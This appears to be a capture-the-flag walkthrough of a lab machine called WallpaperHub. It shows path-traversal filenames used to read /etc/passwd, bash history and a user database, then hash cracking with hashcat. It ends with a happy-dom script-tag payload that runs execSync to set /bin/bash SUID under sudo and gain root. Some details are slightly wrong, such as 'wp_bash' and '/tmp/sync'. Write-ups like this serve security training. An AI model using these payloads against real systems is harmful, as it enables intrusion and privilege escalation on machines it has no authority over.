---
title: WallpaperHub PGP walkthrough
description: Target - WallpaperHub, OS - Linux, Difficulty - Very Hard
readTime: 20 min read
image: ../assets/images/wph/whub.png
date: 03-01-2026
---
#### ***Enumeration***

Started off with a nmap scan and gathered information about the target  network, systems, services, open ports.

```
nmap -sVC -p- -Pn -n -T4 --open --min-rate=1000 -oN Wall-nmap 192.168.164.204

Nmap scan report for 192.168.164.204
Host is up (0.36s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.58 (Ubuntu)
5000/tcp open  upnp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Fri, 14 Feb 2025 15:42:24 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1132
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1.0">
|     <title>Wallpaper Hub - Home</title>
|     <link rel="stylesheet" href="/static/css/home.css">
|     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
|     </head>
|     <body>
|     <nav>
|     <div class="logo">Wallpaper Hub</div>
|     class="nav-links">
|     <li><a href="/"><i class="fas fa-home"></i> Home </a></li> |
|     <li><a href="/login"><i class="fas fa-sign-in-alt"></i> Login </a></li> |
|     <li><a href="/register"><i class="fas fa-user-plus"></i> Register</a></li> |
|     <li><a href="/gallery"><i class="fas fa-images"></i>
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.0.1 Python/3.12.3
|     Date: Fri, 14 Feb 2025 15:42:41 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5000-TCP:V=7.94SVN%I=7%D=2/14%Time=67AF6460%P=aarch64-unknown-linux
SF:-gnu%r(GetRequest,51B,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\
SF:.0\.1\x20Python/3\.12\.3\r\nDate:\x20Fri,\x2014\x20Feb\x202025\x2015:42
SF::24\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-L
SF:ength:\x201132\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html
SF:\x20lang=\"en\">\n<head>\n\x20\x20<meta\x20charset=\"UTF-8\">\n\x20\x20
SF:<meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-
SF:scale=1\.0\">\n\x20\x20<title>Wallpaper\x20Hub\x20-\x20Home</title>\n\x
SF:20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/home\.css\">\n\
SF:x20\x20<link\x20rel=\"stylesheet\"\x20href=\"https://cdnjs\.cloudflare\
SF:.com/ajax/libs/font-awesome/6\.0\.0-beta3/css/all\.min\.css\">\n</head>
SF:\n<body>\n\x20\x20<nav>\n\x20\x20\x20\x20<div\x20class=\"logo\">Wallpap
SF:er\x20Hub</div>\n\x20\x20\x20\x20<ul\x20class=\"nav-links\">\n\x20\x20\
SF:x20\x20\x20\x20\x20\x20<li><a\x20href=\"/\"><i\x20class=\"fas\x20fa-hom
SF:e\"></i>\x20Home\x20</a></li>\x20\|\n\x20\x20\x20\x20\x20\x20<li><a\x20
SF:href=\"/login\"><i\x20class=\"fas\x20fa-sign-in-alt\"></i>\x20Login\x20
SF:</a></li>\x20\|\n\x20\x20\x20\x20\x20\x20<li><a\x20href=\"/register\"><
SF:i\x20class=\"fas\x20fa-user-plus\"></i>\x20Register</a></li>\x20\|\n\x2
SF:0\x20\x20\x20\x20\x20<li><a\x20href=\"/gallery\"><i\x20class=\"fas\x20f
SF:a-images\"></i>")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<html\x20lang=
SF:\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\
SF:x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<title>Error\x20
SF:response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/1\.0'\)\.</
SF:p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20explanation:\x2
SF:0400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x20method\.<
SF:/p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOptions,C7,"HTTP/1\.1\x
SF:20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.1\x20Python/3\.12\.3\r\nDate:\
SF:x20Fri,\x2014\x20Feb\x202025\x2015:42:41\x20GMT\r\nContent-Type:\x20tex
SF:t/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nConte
SF:nt-Length:\x200\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Discovered a web portal at port 5000 named as Wallpaper Hub

![web-page](/1dragon/assets/images/wph/Pasted%20image%2020260105231007.png)

It had a gallery page but downloading images showed 401 unauthorized.

![gallery](/1dragon/assets/images/wph/Pasted%20image%2020260105232010.png)

Upon clicking the register link a registration page showed up. Created a user account with username as admin.

![Register](/1dragon/assets/images/wph/Pasted%20image%2020260105232132.png)

Logged in as newly created user admin


![rev-upload](/1dragon/assets/images/wph/Pasted%20image%2020260105232358.png)

Discovered that images in `/gallery` page can be upload from here.

![uplds](/1dragon/assets/images/wph/Pasted%20image%2020260105232532.png)


![myuplds](/1dragon/assets/images/wph/Pasted%20image%2020260105232553.png)
Created an empty file named as rev.img

Ignited BurpSuite and Intercepted the uploaded file.

![burp-intr](/1dragon/assets/images/wph/Pasted%20image%2020260105233625.png)

In the ```filename="rev.png"```  modified it as ```../../../../../etc/passwd``` to see if that actually fetches the `/etc/passwd` file contents

![modfilename](/1dragon/assets/images/wph/Pasted%20image%2020260105233855.png)

The modified file was successfully uploaded and confirmed with the notfication that appeared on the upload page.

![upld_success](/1dragon/assets/images/wph/Pasted%20image%2020260105232532.png)

Headed to `/gallery` and the modified file was displayed below the other default images. Downloaded the modified file to local.

![passwdfile](/1dragon/assets/images/wph/Pasted%20image%2020260105234054.png)

The modification of having the command as the file name actually worked and output of the command was in the downloaded file.

```
cat wallpapers_.._.._.._.._.._etc_passwd 

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:103:104::/nonexistent:/usr/sbin/nologin
uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:105:107::/nonexistent:/usr/sbin/nologin
tss:x:106:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:107:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
wp_hub:x:1001:1001::/home/wp_hub:/bin/bash

```

A user account named `wp_hub`  was discovered from the /etc/passwd file.

Further tried the same technique by uploading an empty image file, intercepted, changed the file name this as `../../../../../../../../home/wp_bash/.bash_history` this helps to see last used commands by the user.

![bshist](/1dragon/assets/images/wph/Pasted%20image%2020260106004538.png)

After downloading the file the bash history showed that the user has executed sqlite3 and worked on a database file.

```
cat  wallpapers_.._.._.._.._.._.._.._.._home_wp_hub_.bash_history  
sqlite3 ~/wallpaper_hub/database.db
```

One more time uploaded an empty image file and modified the filename this time to be `../../../../../../../home/wp_hub/wallpaper_hub/database.db` and the upload was successful.

![dbfile](/1dragon/assets/images/wph/Pasted%20image%2020260106005412.png)

The newly uploaded file was downloaded from the gallery page. Ran the `file` command to view to confirm the file type. It was sqlite3 db file discovered in the previous step.

```
file wallpapers_.._.._.._.._.._.._.._.._home_wp_hub_wallpaper_hub_database.db

wallpapers_.._.._.._.._.._.._.._.._home_wp_hub_wallpaper_hub_database.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 10, database pages 4, cookie 0x2, schema 4, UTF-8, version-valid-for 10
```

Further opened the file with sqlite3 in command line.
Executed . `.tables` command to view list of existing files.
Found users table and executed `select * from users;`

![userh](/1dragon/assets/images/wph/Pasted%20image%2020260106005751.png)
Found the password hash of user wp_hub.

Further used hashcat to crack and found the password.

`hashcat -m 3200 wp_hub,hash /usr/share.wordlists/rockyou.txt --force`

![pwd](/1dragon/assets/images/wph/Pasted%20image%2020260106010108.png)

---

#### ***Initial Access***

Port 22 was open as discovered with nmap hence, logged into the target system via ssh as user wp_hub with the cracked and found password from database.

![local](/1dragon/assets/images/wph/Pasted%20image%2020260106010359.png)

Captured the local.txt under `/home/wp_hub/lcoal.txt`

---

#### ***Privilege Escalation***
Ran `sudo -l` and found that user wp_hub can  `/usr/bin/web-scraper /root/web_src_downloaded/*.html` as root.

![sudo](/1dragon/assets/images/wph/Pasted%20image%2020260106010519.png)
Further moved into the directory `/usr/bin` discovered that the web-scrapper is a symlink pointed to `/opt/scraper/scraper.js`

![](/1dragon/assets/images/wph/Pasted%20image%2020260106010656.png)

Analyzed the file contents of the symlink  `scraper.js` 

```
cat /opt/scraper/scraper.js
#!/usr/bin/env node

const fs = require('fs');
const { Window } = require("happy-dom");

// Check if a file path is provided as a command-line argument
const filePath = process.argv[2];

if (!filePath) {
    console.error('Please provide a file path as an argument.');
    process.exit(1);
}

const window = new Window();
const document = window.document;

// Read the content of the provided file path
fs.readFile(filePath, 'utf-8', (err, data) => {
    if (err) {
        console.error(`Error reading file ${filePath}:`, err);
        return;
    }

    // Use document.write() to add the content to the document
    document.write(data);

    // Log all external imports (scripts, stylesheets, meta tags)
    const links = document.querySelectorAll('link');
    const scripts = document.querySelectorAll('script');
    const metaTags = document.querySelectorAll('meta');
    
    console.log('----------------------------');
    // Output the links (CSS imports)
    console.log('CSS Links:');
    links.forEach(link => {
        console.log(link.href);
    });

    console.log('----------------------------');

    // Output the scripts (JS imports)
    console.log('JavaScript Links:');
    scripts.forEach(script => {
        if (script.src) {
            console.log(script.src);
        } else {
            console.log('Inline script found.');
        }
    });

    console.log('----------------------------');

    // Output the meta tags (for metadata)
    console.log('Meta Tags:');
    metaTags.forEach(meta => {
        console.log(`Name: ${meta.name}, Content: ${meta.content}`);
    });

    console.log('----------------------------');
});

```

The code looked as a web scrapper tool written in js. Here the code is using a dependency package in this line `const { Window } = require("happy-dom");`

Happy-dom js dependency package is vulnerable to 'Arbitrary Code Injection (CVE-2024-51757)'

Upon searching found [exploit-PoC](https://security.snyk.io/vuln/SNYK-JS-HAPPYDOM-8350065 ) a PoC by Synk.

Based on the PoC modified it according to the scenario.

Created a file pwn under /tmp and changed the permissions as executable.

```
echo "chmod 4777 /bin/bash" > /tmp/pwn

chmod +x /tmp/pwn

echo "\`<script src=\"http://192.168.164.204:5000/'+require('child_process').execSync('/tmp/pwn')+'\"></script>\`" > /tmp/pwn.html
```

Pointed  the src for the script towards `/tmp/sync` 
This upon running will modify the permission of /bin/bash as world readable which can be used to get root shell.

![exp](/1dragon/assets/images/wph/Pasted%20image%2020260106012052.png)

After making the initial exploit setup ran the web-scrapper as follows

```
sudo -u root /usr/bin/web-scraper /root/web_src_downloaded/../../tmp/pwn.html

ls -la /bin/bash

/bin/bash -p
```

The file permission was modified as expected for `/bin/bash`
Ran `/bin/bash -p`
Got the root shell

![root_shell](/1dragon/assets/images/wph/Pasted%20image%2020260106012024.png)
Successfully captured the root flag under `/root/proof.txt`

---

										Target compromised - |^| ^ ( |< 3 D